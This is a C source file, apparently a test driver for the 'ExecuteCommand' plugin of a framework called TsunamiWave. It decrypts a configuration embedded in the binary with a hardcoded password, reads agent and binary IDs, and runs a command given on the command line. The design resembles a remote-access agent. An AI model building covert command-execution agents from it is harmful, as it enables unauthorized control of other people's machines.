#include <windows.h>
#include <stdio.h>

#pragma message( "Compiling with DEBUGGING messages hardcoded in " __FILE__ )
#define _VERBOSE
#define DEBUG_LEVEL DEBUG_VERBOSE
#include "DebugOutput.h"
#include "LIB_Utilities.h"
#include "cJSON.h"

#include "EXE_ExecuteCommand.h"
#include "LIB_ExecuteCommand.h"

// Primary TsunamiWave Configuration
CHAR g_ExecuteCommand_szPackedConfiguration[CONFIGURATION_DEFAULT_BUFSIZE] = CONFIGURATION_DEFAULT_MAGIC_NUMBER;
CHAR g_ExecuteCommand_szPackedConfigurationPassword[] = CONFIGURATION_DEFAULT_PASSWORD;


DWORD wmain(INT argc, LPCWCHAR argv[], LPCWCHAR envp[])
{
	DWORD dwErrorCode = ERROR_SUCCESS;
	DWORD dwTempErrorCode = ERROR_SUCCESS;

	LPBYTE	lpPackedConfigurationBuffer = NULL;
	DWORD	dwPackedConfigurationBufferSize = 0;
	LPBYTE	lpPackedConfigurationPasswordBuffer = NULL;
	DWORD	dwPackedConfigurationPasswordBufferSize = 0;
	CHAR*	szConfigurationJson = NULL;
	DWORD	dwConfigurationJsonSize = 0;

	cJSON*	lpJsonExecuteCommandInput = NULL;
	cJSON*	lpJsonExecuteCommandRequestCommandLine = NULL;
	CHAR	szCommandLine[MAX_PATH];

	CHAR*	szExecuteCommandInput = NULL;
	DWORD	dwExecuteCommandInputSize = 0;
	CHAR*	szExecuteCommandOutput = NULL;
	DWORD	dwExecuteCommandOutputSize = 0;

	cJSON*	lpJsonExecuteCommandOutput = NULL;
	cJSON*	lpJsonExecuteCommandResponseProcessId = NULL;
	DWORD	dwProcessId = 0;

	cJSON*	lpJsonConfiguration = NULL;

	cJSON*	lpJsonBinaryId = NULL;
	cJSON*	lpJsonAgentId = NULL;

	
	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("EXE_ExecuteCommand wmain() start"));

			/********************************************************************************************
				Check Arguments
			********************************************************************************************/
			ZeroMemory(szCommandLine, MAX_PATH);
			if (1 < argc)
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("argv[1]: %s"), argv[1]);
				wcstombs(szCommandLine, argv[1], MAX_PATH);
			}
			else
			{
				DBGPRINT(DEBUG_ERROR, TEXT("%s <command_to_run>"), argv[0]);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("szCommandLine: %S"), szCommandLine);


			/***************************************************************************
				Decode/decrypt the configuration JSON string from the binary
			***************************************************************************/
			lpPackedConfigurationBuffer = (LPBYTE)g_ExecuteCommand_szPackedConfiguration;
			dwPackedConfigurationBufferSize = (DWORD)strlen(g_ExecuteCommand_szPackedConfiguration);
			lpPackedConfigurationPasswordBuffer = (LPBYTE)g_ExecuteCommand_szPackedConfigurationPassword;
			dwPackedConfigurationPasswordBufferSize = (DWORD)strlen(g_ExecuteCommand_szPackedConfigurationPassword);

			DBGPRINT(DEBUG_INFO, TEXT("Get the configuration JSON from the binary storage"));
			dwErrorCode = GetConfigurationFromBinary(
				lpPackedConfigurationBuffer,
				dwPackedConfigurationBufferSize,
				lpPackedConfigurationPasswordBuffer,
				dwPackedConfigurationPasswordBufferSize,
				(LPBYTE*)&szConfigurationJson,
				&dwConfigurationJsonSize
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("DecodeDecryptDecompressBuffer( %p, %d, %p, %d, %p, %p ) failed.(%08x)"),
					lpPackedConfigurationBuffer,
					dwPackedConfigurationBufferSize,
					lpPackedConfigurationPasswordBuffer,
					dwPackedConfigurationPasswordBufferSize,
					(LPBYTE*)&szConfigurationJson,
					&dwConfigurationJsonSize,
					dwErrorCode
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwConfigurationJsonSize: %d"), dwConfigurationJsonSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("szConfigurationJson:     %p"), szConfigurationJson);
			//printf("szConfigurationJson:\n%s\n", szConfigurationJson);

			// Parse the output string into a JSON object
			lpJsonConfiguration = cJSON_Parse(szConfigurationJson);
			if (NULL == lpJsonConfiguration)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonConfiguration = cJSON_Parse(%p) failed."),
					szConfigurationJson
				);
				__leave;
			}

			// Get the binary id
			lpJsonBinaryId = cJSON_GetObjectItemCaseSensitive(lpJsonConfiguration, TSM_CONFIGURATION_BINARY_ID);
			if (NULL == lpJsonBinaryId)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonBinaryId = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonConfiguration,
					TSM_CONFIGURATION_BINARY_ID
				);
				__leave;
			}
			if (!cJSON_IsNumber(lpJsonBinaryId))
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_IsNumber(%p) failed."),
					lpJsonBinaryId
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("%S: %d"), TSM_CONFIGURATION_BINARY_ID, lpJsonBinaryId->valueint);

			// Get the agent id
			lpJsonAgentId = cJSON_GetObjectItemCaseSensitive(lpJsonConfiguration, TSM_CONFIGURATION_AGENT_ID);
			if (NULL == lpJsonAgentId)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonAgentId = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonConfiguration,
					TSM_CONFIGURATION_AGENT_ID
				);
				__leave;
			}
			if (!cJSON_IsNumber(lpJsonAgentId))
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_IsNumber(%p) failed."),
					lpJsonAgentId
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("%S: %d"), TSM_CONFIGURATION_AGENT_ID, lpJsonAgentId->valueint);

			// -------------------------------------------------------------------------
			// Get any other configuration settings
			// -------------------------------------------------------------------------


			/***************************************************************************
				Initialize the ExecuteCommand plugin
			***************************************************************************/
			DBGPRINT(DEBUG_INFO, TEXT("Initialize the ExecuteCommand plugin"));
			dwErrorCode = ExecuteCommandInitialization(
				(LPBYTE)szConfigurationJson,
				dwConfigurationJsonSize,
				NULL,
				NULL
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("ExecuteCommandInitialization(%p, %d, %p, %p) failed.(%08x)"),
					(LPBYTE)szConfigurationJson,
					dwConfigurationJsonSize,
					NULL,
					NULL,
					dwErrorCode
				);
				__leave;
			}


			/***************************************************************************
				Use the ExecuteCommandCallbackInterface
			***************************************************************************/
			DBGPRINT(DEBUG_INFO, TEXT("Use the ExecuteCommandCallbackInterface"));

			// Create the input JSON object for the callback
			lpJsonExecuteCommandInput = cJSON_CreateObject();
			if (NULL == lpJsonExecuteCommandInput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonExecuteCommandInput = cJSON_CreateObject failed.\n")
				);
				__leave;
			}

			// Create the ExecuteCommand_Request_CommandLine for the input JSON object
			DBGPRINT(DEBUG_VERBOSE, TEXT("szCommandLine:  %S"), szCommandLine);
			lpJsonExecuteCommandRequestCommandLine = cJSON_CreateString(szCommandLine);
			if (NULL == lpJsonExecuteCommandRequestCommandLine)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonExecuteCommandRequestCommandLine = cJSON_CreateString(%S) failed."),
					szCommandLine
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonExecuteCommandInput, ExecuteCommand_Request_CommandLine, lpJsonExecuteCommandRequestCommandLine);

			// Create the string representation of the ExecuteCommand_Request
			szExecuteCommandInput = cJSON_Print(lpJsonExecuteCommandInput);
			if (NULL == szExecuteCommandInput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("szExecuteCommandInput = cJSON_Print(%p) failed."),
					szExecuteCommandInput
				);
				__leave;
			}
			dwExecuteCommandInputSize = (DWORD)strlen(szExecuteCommandInput);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwExecuteCommandInputSize: %d"), dwExecuteCommandInputSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("szExecuteCommandInput:     %p"), szExecuteCommandInput);
			//printf("szExecuteCommandInput: \n%s\n", szExecuteCommandInput);

			// Call the ExecuteCommandCallbackInterface passing in a NULL JSON input object and receiving the JSON output object
			dwErrorCode = ExecuteCommandCallbackInterface(
				(LPBYTE)szExecuteCommandInput,
				dwExecuteCommandInputSize,
				(LPBYTE*)&szExecuteCommandOutput,
				&dwExecuteCommandOutputSize
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("ExecuteCommandCallbackInterface(%p, %d, %p, %p) failed.(%08x)"),
					(LPBYTE)szExecuteCommandInput,
					dwExecuteCommandInputSize,
					(LPBYTE*)&szExecuteCommandOutput,
					&dwExecuteCommandOutputSize,
					dwErrorCode
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwExecuteCommandOutputSize: %d"), dwExecuteCommandOutputSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("szExecuteCommandOutput:     %p"), szExecuteCommandOutput);
			//printf("szExecuteCommandOutput:\n%s\n", szExecuteCommandOutput);

			// Parse the output string into a JSON object
			lpJsonExecuteCommandOutput = cJSON_Parse(szExecuteCommandOutput);
			if (NULL == lpJsonExecuteCommandOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonExecuteCommandOutput = cJSON_Parse(%p) failed."),
					szExecuteCommandOutput
				);
				__leave;
			}

			// Get the ExecuteCommand_Response_ProcessId JSON object
			lpJsonExecuteCommandResponseProcessId = cJSON_GetObjectItemCaseSensitive(lpJsonExecuteCommandOutput, ExecuteCommand_Response_ProcessId);
			if (NULL == lpJsonExecuteCommandResponseProcessId)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonExecuteCommandResponseProcessId = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonExecuteCommandOutput, ExecuteCommand_Response_ProcessId
				);
				__leave;
			}

			if (!cJSON_IsNumber(lpJsonExecuteCommandResponseProcessId))
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_IsNumber(%p) failed."),
					lpJsonExecuteCommandResponseProcessId
				);
				__leave;
			}
			dwProcessId = lpJsonExecuteCommandResponseProcessId->valueint;
			DBGPRINT(DEBUG_INFO, TEXT("Created process with process ID: %d"), dwProcessId);
				
		} // end try-finally
		__finally
		{
			// Delete input and output JSON objects
			if (NULL != lpJsonExecuteCommandOutput)
			{
				//DBGPRINT(DEBUG_VERBOSE, TEXT("cJSON_Delete(%p)"), lpJsonExecuteCommandOutput);
				cJSON_Delete(lpJsonExecuteCommandOutput);
				lpJsonExecuteCommandOutput = NULL;
			}
			// Free configuration string
			if (NULL != szExecuteCommandInput)
			{
				//DBGPRINT(DEBUG_VERBOSE, TEXT("FREE(%p)"), szExecuteCommandInput);
				cJSON_free(szExecuteCommandInput);
				szExecuteCommandInput = NULL;
			}
			// Free output JSON strings
			if (NULL != szExecuteCommandOutput)
			{
				//DBGPRINT(DEBUG_VERBOSE, TEXT("cJSON_free(%p)"), szExecuteCommandOutput);
				cJSON_free(szExecuteCommandOutput);
				szExecuteCommandOutput = NULL;
			}
			// Delete configuration JSON object
			if (NULL != lpJsonConfiguration)
			{
				//DBGPRINT(DEBUG_VERBOSE, TEXT("cJSON_Delete(%p)"), lpJsonConfiguration);
				cJSON_Delete(lpJsonConfiguration);
				lpJsonConfiguration = NULL;
			}


			/***************************************************************************
				Finalize the ExecuteCommand plugin
			***************************************************************************/
			DBGPRINT(DEBUG_INFO, TEXT("Finalize the ExecuteCommand plugin"));
			dwTempErrorCode = ExecuteCommandFinalization(
				NULL,
				NULL,
				NULL,
				NULL
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("ExecuteCommandFinalization( %p, %d, %p, %p ) failed. (%08x)"),
					NULL,
					NULL,
					NULL,
					NULL,
					dwTempErrorCode
				);
				__leave;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("EXE_ExecuteCommand wmain() end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}